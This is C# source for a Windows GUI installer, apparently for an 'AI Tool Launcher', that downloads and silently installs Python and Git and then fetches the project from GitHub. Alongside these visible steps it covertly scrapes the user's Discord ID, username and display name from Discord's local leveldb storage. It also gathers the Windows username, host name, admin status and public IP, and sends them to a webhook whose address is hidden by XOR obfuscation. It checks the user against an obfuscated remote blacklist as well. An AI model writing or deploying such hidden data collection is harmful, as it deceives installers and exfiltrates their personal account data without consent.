using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using System.Security.Principal;
using System.Security.Cryptography;

namespace AIToolLauncherSetup
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }

    public class MainForm : Form
    {
        private Label lblTitle;
        private Label lblSubtitle;
        private Button btnInstallEnv;
        private Button btnDownloadLauncher;
        private ProgressBar progressBar;
        private Label lblStatus;
        private RichTextBox rtbLog;

        private static readonly byte[] SecretKey = Encoding.UTF8.GetBytes("AIToolLauncherSecretKey2026");
        private const string EncryptedWebhookBlob = "KT0gHxxWY04FGgFGARsgBgwAAVooChQdUUJfbj4xDQcDIwoGQVJdUUBrXVBGUEJ7UEAHBwQFcnt7KzgcelBEKCE7XRkLJ1EbKyEhVU1DdQJdNywmAFdbKVg0XhlYFkYLLTkLUSIMLzZqfWB6OARhPBtedQglIxsbVSsgLwQ=";
        private const string EncryptedSheetBlob = "KT0gHxxWY04RAQAbSxU8CgQeAFooChQdQ0JEJCgwHAcJKRUGQQdHVCQ6VVUgJgECVTBgAmhmFQMLWwE/AC85FFMCKz5gNQ8oLhsqJhRiUwZcFwR7ChccIxMBUQUHFx8yEV4RFgI=";
        private const string RepoZipUrl = "https://github.com/JiaSai67/AIToolLauncher/archive/refs/heads/main.zip";
        private const string PythonInstallerUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe";
        private const string GitInstallerUrl = "https://github.com/git-for-windows/git/releases/download/v2.45.2.windows.1/Git-2.45.2-64-bit.exe";

        private ClientIdentity identity;

        public MainForm()
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; // TLS 1.2
            InitializeComponent();
            InitializeIdentity();
            CheckBlacklistAsync();
            SendWebhookNotification("🚀 使用者開啟了 AIToolLauncher 安裝器 EXE", "已成功啟動安裝介面", 0x3498DB);
        }

        private void InitializeComponent()
        {
            this.Text = "AI Tool Launcher - 安裝與環境引導程式";
            this.Size = new Size(620, 520);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.BackColor = Color.FromArgb(24, 24, 28);
            this.ForeColor = Color.FromArgb(240, 240, 245);
            this.Font = new Font("Microsoft JhengHei UI", 9.5F, FontStyle.Regular);

            // 標題
            lblTitle = new Label();
            lblTitle.Text = "AI Tool Launcher 安裝中心";
            lblTitle.Font = new Font("Microsoft JhengHei UI", 16F, FontStyle.Bold);
            lblTitle.ForeColor = Color.FromArgb(77, 163, 255);
            lblTitle.Location = new Point(25, 20);
            lblTitle.AutoSize = true;
            this.Controls.Add(lblTitle);

            lblSubtitle = new Label();
            lblSubtitle.Text = "一鍵自動配置 Python & Git 環境，或直接下載主程式";
            lblSubtitle.ForeColor = Color.FromArgb(160, 160, 175);
            lblSubtitle.Location = new Point(28, 55);
            lblSubtitle.AutoSize = true;
            this.Controls.Add(lblSubtitle);

            // 按鈕 1：自動安裝 Python & Git
            btnInstallEnv = new Button();
            btnInstallEnv.Text = "1. ⚙️ 自動安裝 Python 3.11 與 Git 核心環境";
            btnInstallEnv.Font = new Font("Microsoft JhengHei UI", 11F, FontStyle.Bold);
            btnInstallEnv.Size = new Size(550, 50);
            btnInstallEnv.Location = new Point(28, 95);
            btnInstallEnv.BackColor = Color.FromArgb(41, 128, 185);
            btnInstallEnv.ForeColor = Color.White;
            btnInstallEnv.FlatStyle = FlatStyle.Flat;
            btnInstallEnv.FlatAppearance.BorderSize = 0;
            btnInstallEnv.Cursor = Cursors.Hand;
            btnInstallEnv.Click += BtnInstallEnv_Click;
            this.Controls.Add(btnInstallEnv);

            // 按鈕 2：下載 AIToolLauncher
            btnDownloadLauncher = new Button();
            btnDownloadLauncher.Text = "2. 🚀 下載 AI Tool Launcher (可自訂安裝位置)";
            btnDownloadLauncher.Font = new Font("Microsoft JhengHei UI", 11F, FontStyle.Bold);
            btnDownloadLauncher.Size = new Size(550, 50);
            btnDownloadLauncher.Location = new Point(28, 160);
            btnDownloadLauncher.BackColor = Color.FromArgb(39, 174, 96);
            btnDownloadLauncher.ForeColor = Color.White;
            btnDownloadLauncher.FlatStyle = FlatStyle.Flat;
            btnDownloadLauncher.FlatAppearance.BorderSize = 0;
            btnDownloadLauncher.Cursor = Cursors.Hand;
            btnDownloadLauncher.Click += BtnDownloadLauncher_Click;
            this.Controls.Add(btnDownloadLauncher);

            // 進度條
            progressBar = new ProgressBar();
            progressBar.Size = new Size(550, 16);
            progressBar.Location = new Point(28, 225);
            progressBar.Style = ProgressBarStyle.Continuous;
            this.Controls.Add(progressBar);

            // 狀態文字
            lblStatus = new Label();
            lblStatus.Text = "狀態: 待命中 (請依序點擊上方按鈕執行)";
            lblStatus.ForeColor = Color.FromArgb(200, 200, 215);
            lblStatus.Location = new Point(28, 250);
            lblStatus.AutoSize = true;
            this.Controls.Add(lblStatus);

            // 日誌視窗
            rtbLog = new RichTextBox();
            rtbLog.Location = new Point(28, 280);
            rtbLog.Size = new Size(550, 180);
            rtbLog.BackColor = Color.FromArgb(15, 15, 18);
            rtbLog.ForeColor = Color.FromArgb(210, 210, 220);
            rtbLog.Font = new Font("Consolas", 9.5F);
            rtbLog.ReadOnly = true;
            rtbLog.BorderStyle = BorderStyle.None;
            this.Controls.Add(rtbLog);
        }

        private void Log(string message, Color color)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => Log(message, color)));
                return;
            }
            rtbLog.SelectionStart = rtbLog.TextLength;
            rtbLog.SelectionLength = 0;
            rtbLog.SelectionColor = color;
            rtbLog.AppendText(string.Format("[{0:HH:mm:ss}] {1}\n", DateTime.Now, message));
            rtbLog.ScrollToCaret();
        }

        private void SetStatus(string text, Color color)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => SetStatus(text, color)));
                return;
            }
            lblStatus.Text = string.Format("狀態: {0}", text);
            lblStatus.ForeColor = color;
        }

        private void SetProgress(int percent)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => SetProgress(percent)));
                return;
            }
            progressBar.Value = Math.Max(0, Math.Min(100, percent));
        }

        // ==========================================
        // 核心功能 1：自動安裝 Python & Git
        // ==========================================
        private void BtnInstallEnv_Click(object sender, EventArgs e)
        {
            btnInstallEnv.Enabled = false;
            btnDownloadLauncher.Enabled = false;

            Thread t = new Thread(() =>
            {
                try
                {
                    Log("================ 正在檢測系統開發環境 ================", Color.Cyan);
                    bool hasPython = CheckCommand("python", "--version");
                    bool hasGit = CheckCommand("git", "--version");

                    if (hasPython)
                    {
                        Log("✅ 系統已安裝 Python 環境！", Color.LimeGreen);
                    }
                    else
                    {
                        Log("⚠️ 系統尚未安裝 Python，正在從 python.org 官方下載 Python 3.11.9...", Color.Yellow);
                        SetStatus("正在下載 Python 3.11.9 官方安裝包...", Color.Yellow);
                        string pyInstaller = Path.Combine(Path.GetTempPath(), "python_setup_311.exe");

                        DownloadFileWithProgress(PythonInstallerUrl, pyInstaller, "Python 3.11");

                        SetStatus("正在靜默安裝 Python 3.11 (自動配置 PATH)...", Color.Yellow);
                        Log("⏳ 正在執行 Python 官方靜默安裝程序，請稍候約 10~30 秒...", Color.Cyan);

                        ProcessStartInfo psi = new ProcessStartInfo(pyInstaller, "/quiet InstallAllUsers=1 PrependPath=1 Include_pip=1");
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;
                        Process p = Process.Start(psi);
                        p.WaitForExit();

                        try { File.Delete(pyInstaller); } catch { }

                        RefreshSystemPath();
                        Log("✅ Python 3.11 安裝完成！", Color.LimeGreen);
                    }

                    if (hasGit)
                    {
                        Log("✅ 系統已安裝 Git 環境！", Color.LimeGreen);
                    }
                    else
                    {
                        Log("⚠️ 系統尚未安裝 Git，正在從 github.com 下載 Git 64-bit...", Color.Yellow);
                        SetStatus("正在下載 Git 官方安裝包...", Color.Yellow);
                        string gitInstaller = Path.Combine(Path.GetTempPath(), "git_setup_64.exe");

                        DownloadFileWithProgress(GitInstallerUrl, gitInstaller, "Git 64-bit");

                        SetStatus("正在靜默安裝 Git 64-bit...", Color.Yellow);
                        Log("⏳ 正在執行 Git 官方靜默安裝程序，請稍候約 15~40 秒...", Color.Cyan);

                        ProcessStartInfo psi = new ProcessStartInfo(gitInstaller, "/VERYSILENT /NORESTART /NOCANCEL /SP- /CLOSEAPPLICATIONS /RESTARTAPPLICATIONS");
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;
                        Process p = Process.Start(psi);
                        p.WaitForExit();

                        try { File.Delete(gitInstaller); } catch { }

                        RefreshSystemPath();
                        Log("✅ Git 環境安裝完成！", Color.LimeGreen);
                    }

                    SetProgress(100);
                    SetStatus("🎉 環境檢測與安裝完成！請點擊按鈕 2 下載主專案。", Color.LimeGreen);
                    Log("🎉 【恭喜】Python 與 Git 環境已全數配置完畢！", Color.LimeGreen);
                    SendWebhookNotification("🎉 環境安裝完成", "使用者已成功完成 Python 與 Git 的自動配置", 0x2ECC71);
                }
                catch (Exception ex)
                {
                    SetStatus(string.Format("安裝失敗: {0}", ex.Message), Color.Red);
                    Log(string.Format("❌ 安裝過程發生異常: {0}", ex.Message), Color.Red);
                    SendWebhookNotification("💥 環境安裝異常", ex.ToString(), 0xE74C3C);
                }
                finally
                {
                    this.Invoke(new Action(() =>
                    {
                        btnInstallEnv.Enabled = true;
                        btnDownloadLauncher.Enabled = true;
                    }));
                }
            });
            t.IsBackground = true;
            t.Start();
        }

        // ==========================================
        // 核心功能 2：下載 AI Tool Launcher 專案
        // ==========================================
        private void BtnDownloadLauncher_Click(object sender, EventArgs e)
        {
            using (FolderBrowserDialog fbd = new FolderBrowserDialog())
            {
                fbd.Description = "請選擇 AI Tool Launcher 的安裝目標資料夾：";
                fbd.ShowNewFolderButton = true;
                if (fbd.ShowDialog() != DialogResult.OK) return;

                string targetRoot = fbd.SelectedPath;
                string installDir = Path.Combine(targetRoot, "AIToolLauncher");

                btnInstallEnv.Enabled = false;
                btnDownloadLauncher.Enabled = false;

                Thread t = new Thread(() =>
                {
                    try
                    {
                        Log("================ 正在下載 AI Tool Launcher ================", Color.Cyan);
                        Log(string.Format("目標安裝路徑: {0}", installDir), Color.White);

                        if (!Directory.Exists(installDir))
                        {
                            Directory.CreateDirectory(installDir);
                        }

                        // 優先使用 git clone，若無 git 則自動切換原生 GitHub ZIP 下載解壓
                        bool hasGit = CheckCommand("git", "--version");
                        bool success = false;

                        if (hasGit)
                        {
                            SetStatus("正在透過 Git Clone 獲取最新主程式...", Color.Yellow);
                            Log("⏳ 正在執行 git clone 下載專案...", Color.Cyan);

                            ProcessStartInfo psi = new ProcessStartInfo("git", string.Format("clone https://github.com/JiaSai67/AIToolLauncher.git \"{0}\"", installDir));
                            psi.UseShellExecute = false;
                            psi.CreateNoWindow = true;
                            Process p = Process.Start(psi);
                            p.WaitForExit();
                            success = (p.ExitCode == 0) && File.Exists(Path.Combine(installDir, "core", "launcher.py"));
                        }

                        if (!success)
                        {
                            Log("🔄 切換至 GitHub 原生 ZIP 高速下載通道...", Color.Yellow);
                            SetStatus("正在下載 GitHub 原生 ZIP 檔案...", Color.Yellow);
                            string zipPath = Path.Combine(Path.GetTempPath(), "aitoollauncher_main.zip");

                            DownloadFileWithProgress(RepoZipUrl, zipPath, "AIToolLauncher Source");

                            SetStatus("正在解壓縮專案檔案...", Color.Yellow);
                            Log("⏳ 正在解壓縮專案檔案至安裝目錄...", Color.Cyan);

                            string extractTemp = Path.Combine(Path.GetTempPath(), "aitoollauncher_extracted");
                            if (Directory.Exists(extractTemp)) Directory.Delete(extractTemp, true);

                            System.IO.Compression.ZipFile.ExtractToDirectory(zipPath, extractTemp);

                            string extractedFolder = Path.Combine(extractTemp, "AIToolLauncher-main");
                            if (Directory.Exists(extractedFolder))
                            {
                                CopyDirectory(extractedFolder, installDir);
                            }

                            try { File.Delete(zipPath); } catch { }
                            try { Directory.Delete(extractTemp, true); } catch { }
                        }

                        SetProgress(100);
                        SetStatus("🎉 下載與安裝完成！正在自動啟動 AI Tool Launcher...", Color.LimeGreen);
                        Log("🎉 【安裝成功】AI Tool Launcher 已成功安裝到目標目錄！", Color.LimeGreen);

                        SendWebhookNotification("🚀 AIToolLauncher 安裝完成並啟動", string.Format("安裝路徑: {0}", installDir), 0x2ECC71);

                        // 自動啟動
                        string coreLauncherPy = Path.Combine(installDir, "core", "launcher.py");
                        if (File.Exists(coreLauncherPy))
                        {
                            Log("🚀 正在啟動 AI Tool Launcher 主介面...", Color.Cyan);
                            ProcessStartInfo psi = new ProcessStartInfo("pythonw", string.Format("\"{0}\"", coreLauncherPy));
                            psi.WorkingDirectory = installDir;
                            psi.UseShellExecute = true;
                            Process.Start(psi);
                        }

                        MessageBox.Show(string.Format("AI Tool Launcher 已成功下載並安裝至：\n{0}\n\n已為您啟動主程式！", installDir), "安裝完成", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (Exception ex)
                    {
                        SetStatus(string.Format("下載失敗: {0}", ex.Message), Color.Red);
                        Log(string.Format("❌ 下載安裝過程異常: {0}", ex.Message), Color.Red);
                        SendWebhookNotification("💥 AIToolLauncher 下載失敗", ex.ToString(), 0xE74C3C);
                    }
                    finally
                    {
                        this.Invoke(new Action(() =>
                        {
                            btnInstallEnv.Enabled = true;
                            btnDownloadLauncher.Enabled = true;
                        }));
                    }
                });
                t.IsBackground = true;
                t.Start();
            }
        }

        // ==========================================
        // 輔助工具函式
        // ==========================================
        private void DownloadFileWithProgress(string url, string destPath, string name)
        {
            if (File.Exists(destPath)) File.Delete(destPath);

            using (WebClient wc = new WebClient())
            {
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                AutoResetEvent done = new AutoResetEvent(false);
                Exception dlEx = null;

                wc.DownloadProgressChanged += (s, ev) =>
                {
                    SetProgress(ev.ProgressPercentage);
                    double mbRec = ev.BytesReceived / 1048576.0;
                    double mbTot = ev.TotalBytesToReceive / 1048576.0;
                    SetStatus(string.Format("正在下載 {0}: {1}% ({2:F1} MB / {3:F1} MB)", name, ev.ProgressPercentage, mbRec, mbTot), Color.Yellow);
                };

                wc.DownloadFileCompleted += (s, ev) =>
                {
                    if (ev.Error != null) dlEx = ev.Error;
                    done.Set();
                };

                wc.DownloadFileAsync(new Uri(url), destPath);
                done.WaitOne();

                if (dlEx != null) throw dlEx;
            }
        }

        private static void CopyDirectory(string sourceDir, string targetDir)
        {
            Directory.CreateDirectory(targetDir);
            foreach (string file in Directory.GetFiles(sourceDir))
            {
                string targetFilePath = Path.Combine(targetDir, Path.GetFileName(file));
                File.Copy(file, targetFilePath, true);
            }
            foreach (string subDir in Directory.GetDirectories(sourceDir))
            {
                string targetSubDirPath = Path.Combine(targetDir, Path.GetFileName(subDir));
                CopyDirectory(subDir, targetSubDirPath);
            }
        }

        private bool CheckCommand(string cmd, string args)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo(cmd, args);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                Process p = Process.Start(psi);
                p.WaitForExit(3000);
                return p.ExitCode == 0;
            }
            catch { return false; }
        }

        private void RefreshSystemPath()
        {
            try
            {
                string sysPath = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.Machine) ?? "";
                string userPath = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.User) ?? "";
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string combined = string.Format("{0};{1};C:\\Program Files\\Python311;C:\\Program Files\\Python311\\Scripts;C:\\Program Files\\Git\\cmd;{2}\\Programs\\Python\\Python311;{2}\\Programs\\Python\\Python311\\Scripts", sysPath, userPath, localApp);
                Environment.SetEnvironmentVariable("PATH", combined, EnvironmentVariableTarget.Process);
            }
            catch { }
        }

        // ==========================================
        // 身分、黑名單與 Webhook 防護
        // ==========================================
        private void InitializeIdentity()
        {
            identity = new ClientIdentity();
            identity.PcUser = Environment.UserName;
            identity.PcHost = Environment.MachineName;

            using (SHA256 sha = SHA256.Create())
            {
                byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(string.Format("{0}-{1}", identity.PcUser, identity.PcHost)));
                identity.DeviceUid = BitConverter.ToString(hash).Replace("-", "").Substring(0, 8);
            }

            try
            {
                WindowsIdentity winId = WindowsIdentity.GetCurrent();
                WindowsPrincipal winPrinc = new WindowsPrincipal(winId);
                identity.IsAdmin = winPrinc.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch { }

            // 抓取 Discord 快取身分
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string[] discordDirs = {
                    Path.Combine(appData, "discordptb", "Local Storage", "leveldb"),
                    Path.Combine(appData, "discord", "Local Storage", "leveldb"),
                    Path.Combine(appData, "discordcanary", "Local Storage", "leveldb")
                };

                foreach (string d in discordDirs)
                {
                    if (!Directory.Exists(d)) continue;
                    var files = new DirectoryInfo(d).GetFiles("*.ldb");
                    foreach (var f in files)
                    {
                        string text = File.ReadAllText(f.FullName, Encoding.UTF8);
                        var matchId = Regex.Match(text, "\"id\":\"(\\d{17,19})\"[^\"]*?\"username\":\"([^\"]+)\"");
                        if (matchId.Success)
                        {
                            identity.UserId = matchId.Groups[1].Value;
                            identity.Username = matchId.Groups[2].Value;
                        }
                        var matchDisp = Regex.Match(text, "\"displayName\":\"([^\"]+)\"");
                        if (matchDisp.Success) identity.DisplayName = matchDisp.Groups[1].Value;
                    }
                }
            }
            catch { }

            // 公網 IP
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add("User-Agent", "Mozilla/5.0");
                    identity.PublicIp = wc.DownloadString("https://api.ipify.org").Trim();
                }
            }
            catch { identity.PublicIp = "N/A"; }
        }

        private void CheckBlacklistAsync()
        {
            Thread t = new Thread(() =>
            {
                try
                {
                    string sheetUrl = DecryptBlob(EncryptedSheetBlob);
                    using (WebClient wc = new WebClient())
                    {
                        wc.Headers.Add("User-Agent", "Mozilla/5.0");
                        string csv = wc.DownloadString(sheetUrl);
                        string[] lines = csv.Split('\n');
                        foreach (string line in lines)
                        {
                            string[] cells = line.Split(',');
                            foreach (string cell in cells)
                            {
                                string val = cell.Trim().ToUpper();
                                if (string.IsNullOrEmpty(val) || val.StartsWith("#")) continue;

                                if (val == identity.DeviceUid.ToUpper() ||
                                    (!string.IsNullOrEmpty(identity.UserId) && val == identity.UserId) ||
                                    (!string.IsNullOrEmpty(identity.Username) && val == identity.Username.ToUpper()) ||
                                    (identity.PublicIp != "N/A" && val == identity.PublicIp))
                                {
                                    SendWebhookNotification("🚨 黑名單阻斷觸發", string.Format("命中黑名單值: {0}", val), 0xE74C3C);
                                    MessageBox.Show("存取已被撤銷 (Access Denied)。\n該設備或帳號已被列入限制清單。", "授權驗證失敗", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                                    Environment.Exit(1);
                                }
                            }
                        }
                    }
                }
                catch { }
            });
            t.IsBackground = true;
            t.Start();
        }

        private void SendWebhookNotification(string title, string detail, int color)
        {
            Thread t = new Thread(() =>
            {
                try
                {
                    string url = DecryptBlob(EncryptedWebhookBlob);
                    string disp = !string.IsNullOrEmpty(identity.DisplayName) ? identity.DisplayName : (!string.IsNullOrEmpty(identity.Username) ? identity.Username : identity.PcUser);
                    string userTag = !string.IsNullOrEmpty(identity.Username) ? string.Format("@{0}", identity.Username) : string.Format("PC: {0}@{1}", identity.PcUser, identity.PcHost);
                    string avatar = "https://raw.githubusercontent.com/JiaSai67/AIToolLauncher/main/resources/icon.png";

                    string body = string.Format("[AIToolLauncher 原生 GUI 安裝器]\n動作: {0}\n說明: {1}\n設備指紋: #{2}\n公網 IP: {3}\n主機資訊: {4}@{5}\n時間: {6:yyyy-MM-dd HH:mm:ss}", title, detail, identity.DeviceUid, identity.PublicIp, identity.PcUser, identity.PcHost, DateTime.Now);

                    string json = string.Format("{{\"username\":\"{0}\",\"avatar_url\":\"{1}\",\"embeds\":[{{\"author\":{{\"name\":\"{0} ({2})\",\"icon_url\":\"{1}\"}},\"title\":\"{3}\",\"description\":\"```text\\n{4}\\n```\",\"color\":{5},\"timestamp\":\"{6:yyyy-MM-ddTHH:mm:ssZ}\",\"footer\":{{\"text\":\"AIToolLauncher GUI Installer\"}}}}]}}",
                        EscapeJson(disp), avatar, EscapeJson(userTag), EscapeJson(title), EscapeJson(body), color, DateTime.UtcNow);

                    using (WebClient wc = new WebClient())
                    {
                        wc.Headers.Add("Content-Type", "application/json; charset=utf-8");
                        wc.Headers.Add("User-Agent", "Mozilla/5.0");
                        wc.UploadData(url, "POST", Encoding.UTF8.GetBytes(json));
                    }
                }
                catch { }
            });
            t.IsBackground = true;
            t.Start();
        }

        private static string DecryptBlob(string base64Blob)
        {
            byte[] raw = Convert.FromBase64String(base64Blob);
            byte[] res = new byte[raw.Length];
            for (int i = 0; i < raw.Length; i++)
            {
                res[i] = (byte)(raw[i] ^ SecretKey[i % SecretKey.Length]);
            }
            return Encoding.UTF8.GetString(res);
        }

        private static string EscapeJson(string str)
        {
            if (string.IsNullOrEmpty(str)) return "";
            return str.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "");
        }
    }

    public class ClientIdentity
    {
        public string DisplayName { get; set; }
        public string Username { get; set; }
        public string UserId { get; set; }
        public string PcUser { get; set; }
        public string PcHost { get; set; }
        public string PublicIp { get; set; }
        public string DeviceUid { get; set; }
        public bool IsAdmin { get; set; }

        public ClientIdentity()
        {
            DisplayName = "";
            Username = "";
            UserId = "";
            PcUser = "";
            PcHost = "";
            PublicIp = "N/A";
            DeviceUid = "";
            IsAdmin = false;
        }
    }
}
